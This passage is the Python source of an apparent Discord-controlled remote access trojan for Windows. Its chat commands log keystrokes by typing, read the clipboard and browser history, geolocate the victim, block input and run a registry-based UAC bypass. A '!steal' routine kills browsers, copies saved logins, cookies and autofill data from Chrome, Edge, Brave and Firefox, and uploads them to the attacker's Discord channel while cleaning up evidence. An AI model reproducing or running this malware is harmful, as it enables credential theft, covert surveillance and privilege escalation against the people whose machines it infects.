    elif message.content.startswith("!cd"):
        try:
            directory = message.content[4:]
            os.chdir(directory)
            await message.channel.send(f"[*] Changed directory to {os.getcwd()}")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    elif message.content == "!help":
        try:
            help_parts = []
            current_part = ""
            
            for line in HELP_MENU.split('\n'):
                if len(current_part + line + '\n') > 1900:
                    help_parts.append(current_part)
                    current_part = line + '\n'
                else:
                    current_part += line + '\n'
            
            if current_part:
                help_parts.append(current_part)
            
            for i, part in enumerate(help_parts):
                await message.channel.send(f"Help Menu (Part {i+1}/{len(help_parts)}):\n{part}")
        except Exception as e:
            await message.channel.send(f"[!] Error displaying help menu: {str(e)}")

    elif message.content.startswith("!write"):
        try:
            if 'pyautogui' not in sys.modules:
                await message.channel.send("[!] Error: pyautogui module not installed")
                return
                
            import pyautogui
            text = message.content[7:]
            
            async def type_text():
                if text.lower() == "enter":
                    pyautogui.press("enter")
                else:
                    pyautogui.typewrite(text)
            
            await asyncio.to_thread(type_text)
            await message.channel.send("[*] Text typed")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    elif message.content == "!history":
        try:
            if 'browserhistory' not in sys.modules:
                await message.channel.send("[!] Error: browserhistory module not installed")
                return
                
            import browserhistory as bh
            
            async def get_history():
                dict_obj = bh.get_browserhistory()
                strobj = str(dict_obj).encode(errors='ignore')
                return strobj
            
            strobj = await asyncio.to_thread(get_history)
            
            temp_file = os.path.join(os.getenv('TEMP'), f"history_{random.randint(1000, 9999)}.txt")
            with open(temp_file, "w", encoding="utf-8") as hist:
                hist.write(str(strobj))
                
            file = discord.File(temp_file, filename="browser_history.txt")
            await message.channel.send("[*] Browser history", file=file)
            os.remove(temp_file)
        except Exception as e:
            await message.channel.send(f"[!] Error retrieving browser history: {str(e)}")

    elif message.content == "!clipboard":
        try:
            import ctypes
            
            cf_text = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            
            async def get_clipboard():
                user32.OpenClipboard(0)
                if user32.IsClipboardFormatAvailable(cf_text):
                    data = user32.GetClipboardData(cf_text)
                    data_locked = kernel32.GlobalLock(data)
                    text = ctypes.c_char_p(data_locked)
                    value = text.value
                    kernel32.GlobalUnlock(data_locked)
                    body = value.decode(errors='replace')
                    user32.CloseClipboard()
                    return body
                else:
                    user32.CloseClipboard()
                    return None
            
            body = await asyncio.to_thread(get_clipboard)
            
            if body:
                if len(body) > 1990:
                    temp_file = os.path.join(os.getenv('TEMP'), f"clipboard_{random.randint(1000, 9999)}.txt")
                    with open(temp_file, "w", encoding="utf-8") as f:
                        f.write(body)
                    file = discord.File(temp_file, filename="clipboard_content.txt")
                    await message.channel.send("[*] Clipboard content", file=file)
                    os.remove(temp_file)
                else:
                    await message.channel.send(f"[*] Clipboard content: {body}")
            else:
                await message.channel.send("[!] No text in clipboard")
        except Exception as e:
            await message.channel.send(f"[!] Error accessing clipboard: {str(e)}")

    elif message.content.startswith("!stopsing"):
        try:
            if 'pid_process' in globals():
                await asyncio.to_thread(os.system, f"taskkill /F /IM {pid_process[1]}")
                await message.channel.send("[*] Playback stopped")
            else:
                await message.channel.send("[!] No active playback to stop")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    elif message.content == "!sysinfo":
        try:
            import platform
            info = platform.uname()
            info_total = f'{info.system} {info.release} {info.machine}'
            
            try:
                ip = await asyncio.to_thread(requests.get, 'https://api.ipify.org', timeout=3)
                ip = ip.text
            except:
                ip = "Unable to retrieve IP"
                
            await message.channel.send(f"[*] System info: {info_total} | IP: {ip}")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")
    
    elif message.content == "!geolocate":
        try:
            services = [
                "https://geolocation-db.com/json",
                "https://ipapi.co/json/",
                "https://freegeoip.app/json/"
            ]
            
            for service in services:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(service, timeout=3) as response:
                            data = await response.json()
                            lat = data.get('latitude', None)
                            lon = data.get('longitude', None)
                            
                            if lat and lon:
                                link = f"http://www.google.com/maps/place/{lat},{lon}"
                                await message.channel.send(f"[*] Location: {link}")
                                return
                except:
                    continue
            
            await message.channel.send("[!] Could not retrieve geolocation data")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    elif message.content == "!admincheck":
        try:
            is_admin = await asyncio.to_thread(ctypes.windll.shell32.IsUserAnAdmin) != 0
            if is_admin:
                await message.channel.send("[*] Running with administrator privileges")
            else:
                await message.channel.send("[!] Not running with administrator privileges")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")
            
    elif message.content == "!uacbypass":
        try:
            async def is_admin():
                try:
                    return ctypes.windll.shell32.IsUserAnAdmin()
                except:
                    return False
            
            if await is_admin():
                await message.channel.send("[*] Already running with administrator privileges")
            else:
                await message.channel.send("[*] Attempting UAC bypass...")
                temp_dir = os.environ.get('TEMP')
                payload_path = os.path.join(temp_dir, "system_update")
                
                with open(payload_path + ".bat", "w") as f:
                    current_script = os.path.abspath(sys.argv[0])
                    f.write(f'@echo off\npowershell -Command "Start-Process \'{sys.executable}\' '
                            f'-ArgumentList \'{current_script}\' -Verb RunAs"')
                key_path = r"Software\Classes\ms-settings\shell\open\command"
                try:
                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'cmd.exe /c "{payload_path}.bat"')
                    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                    winreg.CloseKey(key)
                    
                    await asyncio.to_thread(os.system, "start computerdefaults.exe")
                    await asyncio.sleep(3)
                    
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                    os.remove(payload_path + ".bat")
                    
                    if await is_admin():
                        await message.channel.send("[+] UAC bypass successful! Now running with admin privileges")
                    else:
                        await message.channel.send("[!] UAC bypass attempt completed, but still not running as admin")
                except Exception as e:
                    await message.channel.send(f"[!] UAC bypass failed: {str(e)}")
        except Exception as e:
            await message.channel.send(f"[!] Error during UAC bypass: {str(e)}")

    elif message.content.startswith("!sing"):
        try:
            # Set volume to maximum
            await asyncio.to_thread(volumeup)
            
            # Extract the link from the command
            link = message.content[6:].strip()
            
            if not link:
                await message.channel.send("[!] Please provide a valid URL")
                return
                
            # Validate and format the URL
            if not link.startswith(("http://", "https://")):
                link = "https://" + link
                
            # Check if the URL is valid
            try:
                # Validate URL with a timeout
                await asyncio.wait_for(
                    asyncio.to_thread(
                        requests.head, 
                        link, 
                        timeout=5, 
                        allow_redirects=True
                    ),
                    timeout=8
                )
            except (asyncio.TimeoutError, requests.RequestException):
                await message.channel.send("[!] Invalid or inaccessible URL")
                return
            
            # Import required modules
            try:
                from win32 import win32gui
                import win32con
                import win32process
            except ImportError:
                await message.channel.send("[!] Required modules not available")
                return
                
            await message.channel.send("[*] Starting media playback...")
            
            # Start the process with timeout protection
            try:
                # First attempt - normal start
                process = await asyncio.wait_for(
                    asyncio.create_subprocess_shell(
                        f'start {link}',
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                        shell=True
                    ),
                    timeout=10
                )
                
                # Try to create a hidden desktop for the window
                try:
                    desktop = win32gui.CreateDesktop("hidden_desktop")
                    
                    async def run_on_hidden_desktop():
                        try:
                            await asyncio.to_thread(desktop.SetThreadDesktop)
                            
                            si = win32process.STARTUPINFO()
                            si.lpDesktop = "hidden_desktop"
                            
                            # Start the process on the hidden desktop
                            await asyncio.wait_for(
                                asyncio.to_thread(
                                    subprocess.Popen, 
                                    f'start {link}', 
                                    shell=True, 
                                    startupinfo=si
                                ),
                                timeout=10
                            )
                            
                            # Wait a moment for the window to appear
                            await asyncio.sleep(3)
                            
                            # Hide any YouTube windows
                            def enum_windows_callback(hwnd, _):
                                if win32gui.IsWindowVisible(hwnd):
                                    title = win32gui.GetWindowText(hwnd).lower()
                                    if "youtube" in title or "video" in title or "media" in title:
                                        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                            return True
                            
                            await asyncio.to_thread(win32gui.EnumWindows, enum_windows_callback, None)
                            
                        except Exception as desktop_error:
                            await message.channel.send(f"[!] Desktop error: {str(desktop_error)}")
                        finally:
                            # Always close the desktop
                            try:
                                await asyncio.to_thread(desktop.CloseDesktop)
                            except:
                                pass
                    
                    # Run the hidden desktop function with timeout
                    await asyncio.wait_for(run_on_hidden_desktop(), timeout=15)
                    
                except Exception as desktop_creation_error:
                    # If hidden desktop fails, just hide windows normally
                    await asyncio.sleep(3)
                    
                    # Try to hide any media player windows
                    def hide_media_windows(hwnd, _):
                        if win32gui.IsWindowVisible(hwnd):
                            title = win32gui.GetWindowText(hwnd).lower()
                            if any(keyword in title for keyword in ["youtube", "video", "media", "player"]):
                                try:
                                    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                except:
                                    pass
                        return True
                    
                    await asyncio.to_thread(win32gui.EnumWindows, hide_media_windows, None)
                
                await message.channel.send("[*] Media playback started successfully")
                
            except asyncio.TimeoutError:
                await message.channel.send("[!] Media playback startup timed out")
            except Exception as process_error:
                await message.channel.send(f"[!] Error starting media playback: {str(process_error)}")
                
        except Exception as e:
            await message.channel.send(f"[!] Media playback failed: {str(e)}")

    elif message.content == "!idletime":
        try:
            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ('cbSize', c_uint),
                    ('dwTime', c_int),
                ]

            async def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                return 0
            
            duration = await asyncio.to_thread(get_idle_duration)
            await message.channel.send(f'[*] User idle for {duration:.2f} seconds.')
        except Exception as e:
            await message.channel.send(f"[!] Error getting idle time: {str(e)}")

    elif message.content.startswith("!voice"):
        try:
            await asyncio.to_thread(volumeup)
            import comtypes
            import win32com.client as wincl
            
            async def speak_text():
                speak = wincl.Dispatch("SAPI.SpVoice")
                speak.Speak(message.content[7:])
                comtypes.CoUninitialize()
            
            await asyncio.to_thread(speak_text)
            await message.channel.send("[*] Command successfully executed")
        except Exception as e:
            await message.channel.send(f"[!] Error with voice command: {str(e)}")

    elif message.content.startswith("!blockinput"):
        try:
            import ctypes
            is_admin = await asyncio.to_thread(ctypes.windll.shell32.IsUserAnAdmin) != 0
            if is_admin is True:
                ok = await asyncio.to_thread(windll.user32.BlockInput, True)
                await message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        except Exception as e:
            await message.channel.send(f"[!] Error blocking input: {str(e)}")

    elif message.content.startswith("!unblockinput"):
        try:
            import ctypes
            is_admin = await asyncio.to_thread(ctypes.windll.shell32.IsUserAnAdmin) != 0
            if is_admin is True:
                ok = await asyncio.to_thread(windll.user32.BlockInput, False)
                await message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        except Exception as e:
            await message.channel.send(f"[!] Error unblocking input: {str(e)}")

    elif message.content == "!steal":
        try:
            await message.channel.send("[*] Attempting to steal browser data...")
            
            # First check if we should use the built-in browser stealer
            if 'link' not in globals() or not link:
                # Use the built-in browser data stealer
                await message.channel.send("[*] Using built-in browser data stealer...")
                zip_path, data = await steal_browser_data()
                
                if zip_path and os.path.exists(zip_path):
                    file = discord.File(zip_path, filename="browser_data.zip")
                    await message.channel.send("[*] Browser data retrieved", file=file)
                    
                    # Send a summary of the stolen data instead of the entire JSON
                    if data and len(data) > 1500:  # Discord has message length limits
                        await message.channel.send("[*] Browser data summary extracted successfully")
                    else:
                        await message.channel.send(f"[*] Browser data: {data}")
                    
                    # Clean up the zip file to avoid leaving evidence
                    try:
                        os.remove(zip_path)
                    except:
                        pass
                else:
                    await message.channel.send(f"[!] Failed to retrieve browser data: {data}")
            else:
                # Use the external stealer component
                await message.channel.send("[*] Using external stealer component...")
                result = await steal_user_info()
                await message.channel.send(f"[*] {result}")
                
        except Exception as e:
            await message.channel.send(f"[!] Error during data theft operation: {str(e)}")

async def steal_browser_data():
    try:
        temp_dir = os.path.join(os.environ['TEMP'], ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8)))
        await asyncio.to_thread(os.makedirs, temp_dir, exist_ok=True)
        
        browsers = {
            'chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'),
            'edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'),
            'brave': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'firefox': os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        }
        
        stolen_data = {}
        max_browser_processing_time = 30  # Maximum seconds to spend on each browser
        
        for browser_name, browser_path in browsers.items():
            # Skip non-existent browser paths
            if not await asyncio.to_thread(os.path.exists, browser_path):
                continue
                
            stolen_data[browser_name] = {}
            browser_start_time = time.time()
            
            if browser_name in ['chrome', 'edge', 'brave']:
                # Find profiles for Chrome-based browsers
                profiles = []
                try:
                    if await asyncio.to_thread(os.path.exists, browser_path):
                        items = await asyncio.to_thread(os.listdir, browser_path)
                        for item in items:
                            if item.startswith('Profile ') or item == 'Default':
                                profiles.append(item)
                except Exception as e:
                    stolen_data[browser_name]["error"] = f"Error listing profiles: {str(e)}"
                    continue
                
                # Cap number of profiles to avoid processing too many
                if len(profiles) > 5:
                    profiles = profiles[:5]  # Only process first 5 profiles
                
                for profile in profiles:
                    # Check time spent on this browser to avoid getting stuck
                    if time.time() - browser_start_time > max_browser_processing_time:
                        stolen_data[browser_name]["timeout"] = "Browser processing timed out"
                        break
                        
                    profile_path = os.path.join(browser_path, profile)
                    
                    # Process login data (credentials)
                    login_db = os.path.join(profile_path, 'Login Data')
                    if await asyncio.to_thread(os.path.exists, login_db):
                        login_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_logins.db")
                        try:
                            # Kill browser process to unlock database files
                            await asyncio.to_thread(subprocess.run, 
                                               ['taskkill', '/F', '/IM', f"{browser_name}.exe"], 
                                               shell=True, 
                                               stdout=subprocess.DEVNULL,
                                               stderr=subprocess.DEVNULL,
                                               check=False,
                                               timeout=5)  # Add timeout to avoid hanging
                            await asyncio.sleep(0.5)
                            
                            # Copy the file with timeout protection
                            try:
                                await asyncio.wait_for(
                                    asyncio.to_thread(shutil.copy2, login_db, login_copy),
                                    timeout=5
                                )
                                stolen_data[browser_name][f"{profile}_logins"] = "Extracted"
                            except asyncio.TimeoutError:
                                stolen_data[browser_name][f"{profile}_logins"] = "Timeout during copy"
                        except Exception as e:
                            stolen_data[browser_name][f"{profile}_logins"] = f"Failed: {str(e)}"
                    
                    # Process cookies
                    cookies_db = os.path.join(profile_path, 'Network', 'Cookies')
                    if await asyncio.to_thread(os.path.exists, cookies_db):
                        cookies_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_cookies.db")
                        try:
                            # Copy the file with timeout protection
                            try:
                                await asyncio.wait_for(
                                    asyncio.to_thread(shutil.copy2, cookies_db, cookies_copy),
                                    timeout=5
                                )
                                stolen_data[browser_name][f"{profile}_cookies"] = "Extracted"
                            except asyncio.TimeoutError:
                                stolen_data[browser_name][f"{profile}_cookies"] = "Timeout during copy"
                        except Exception as e:
                            stolen_data[browser_name][f"{profile}_cookies"] = f"Failed: {str(e)}"
                            
                    # Process web data (autofill)
                    webdata_db = os.path.join(profile_path, 'Web Data')
                    if await asyncio.to_thread(os.path.exists, webdata_db):
                        webdata_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_webdata.db")
                        try:
                            # Copy the file with timeout protection
                            try:
                                await asyncio.wait_for(
                                    asyncio.to_thread(shutil.copy2, webdata_db, webdata_copy),
                                    timeout=5
                                )
                                stolen_data[browser_name][f"{profile}_autofill"] = "Extracted"
                            except asyncio.TimeoutError:
                                stolen_data[browser_name][f"{profile}_autofill"] = "Timeout during copy"
                        except Exception as e:
                            stolen_data[browser_name][f"{profile}_autofill"] = f"Failed: {str(e)}"
            
            # Process Firefox
            elif browser_name == 'firefox' and await asyncio.to_thread(os.path.exists, browser_path):
                try:
                    items = await asyncio.to_thread(os.listdir, browser_path)
                    firefox_processed = False
                    
                    for item in items:
                        # Check time spent on this browser to avoid getting stuck
                        if time.time() - browser_start_time > max_browser_processing_time:
                            stolen_data[browser_name]["timeout"] = "Browser processing timed out"
                            break
                            
                        item_path = os.path.join(browser_path, item)
                        if (await asyncio.to_thread(os.path.isdir, item_path) and 
                            ('.default' in item or 'default-release' in item)):
                            profile_path = item_path
                            
                            # Kill Firefox to unlock files
                            await asyncio.to_thread(subprocess.run, 
                                               ['taskkill', '/F', '/IM', 'firefox.exe'], 
                                               shell=True, 
                                               stdout=subprocess.DEVNULL,
                                               stderr=subprocess.DEVNULL,
                                               check=False,
                                               timeout=5)
                            await asyncio.sleep(0.5)
                            
                            # Process cookies
                            cookies_file = os.path.join(profile_path, 'cookies.sqlite')
                            if await asyncio.to_thread(os.path.exists, cookies_file):
                                cookies_copy = os.path.join(temp_dir, "firefox_cookies.sqlite")
                                try:
                                    # Copy with timeout protection
                                    try:
                                        await asyncio.wait_for(
                                            asyncio.to_thread(shutil.copy2, cookies_file, cookies_copy),
                                            timeout=5
                                        )
                                        stolen_data[browser_name]["cookies"] = "Extracted"
                                    except asyncio.TimeoutError:
                                        stolen_data[browser_name]["cookies"] = "Timeout during copy"
                                except Exception:
                                    stolen_data[browser_name]["cookies"] = "Failed"
                            
                            # Process logins
                            logins_file = os.path.join(profile_path, 'logins.json')
                            if await asyncio.to_thread(os.path.exists, logins_file):
                                logins_copy = os.path.join(temp_dir, "firefox_logins.json")
                                try:
                                    # Copy with timeout protection
                                    try:
                                        await asyncio.wait_for(
                                            asyncio.to_thread(shutil.copy2, logins_file, logins_copy),
                                            timeout=5
                                        )
                                        stolen_data[browser_name]["logins"] = "Extracted"
                                    except asyncio.TimeoutError:
                                        stolen_data[browser_name]["logins"] = "Timeout during copy"
                                except Exception:
                                    stolen_data[browser_name]["logins"] = "Failed"
                                    
                            firefox_processed = True
                            break  # Only process one Firefox profile
                    
                    if not firefox_processed:
                        stolen_data[browser_name]["error"] = "No suitable Firefox profile found"
                except Exception as e:
                    stolen_data[browser_name]["error"] = f"Error processing Firefox: {str(e)}"
        
        # Calculate summary statistics
        stolen_data_count = 0
        for browser in stolen_data:
            for key in stolen_data[browser]:
                if stolen_data[browser][key] == "Extracted":
                    stolen_data_count += 1
        
        stolen_data["summary"] = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "total_items": stolen_data_count,
            "user": os.getlogin(),
            "hostname": socket.gethostname()
        }
        
        # Create zip file with all stolen data
        zip_path = os.path.join(os.environ['TEMP'], f"browser_data_{random.randint(1000, 9999)}.zip")
        try:
            await asyncio.wait_for(
                asyncio.to_thread(create_zip, temp_dir, zip_path),
                timeout=30  # Max 30 seconds for zip creation
            )
        except asyncio.TimeoutError:
            return None, "Timeout while creating zip file"
        
        # Clean up temp directory
        try:
            await asyncio.wait_for(
                asyncio.to_thread(shutil.rmtree, temp_dir, ignore_errors=True),
                timeout=5
            )
        except:
            pass
            
        return zip_path, json.dumps(stolen_data, indent=2)
        
    except Exception as e:
        return None, str(e)

def create_zip(source_dir, zip_path):
    with ZipFile(zip_path, 'w') as zipf:
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, source_dir))

try:
    # Start Discord client with token
    if token:
        print("Starting Discord client...")
        client.run(token)
    else:
        print("Error: No token provided. Please rebuild with a valid Discord bot token.")
except Exception as e:
    print(f"Error running client: {str(e)}")
    try:
        # Try with base64 encoded token
        if token:
            encoded_token = base64.b64encode(token.encode()).decode()
            print("Trying with encoded token...")
            client.run(encoded_token)
    except Exception as e2:
        print(f"Error with encoded token: {str(e2)}")
        try:
            # Try with decoded token as last resort
            if token:
                try:
                    # First check if token might already be base64 encoded
                    decoded_token = base64.b64decode(token.encode()).decode()
                    print("Trying with decoded token...")
                    client.run(decoded_token)
                except:
                    print("Failed to connect with all token methods.")
        except:
            print("Failed to connect with any token method. Check your Discord bot token.")
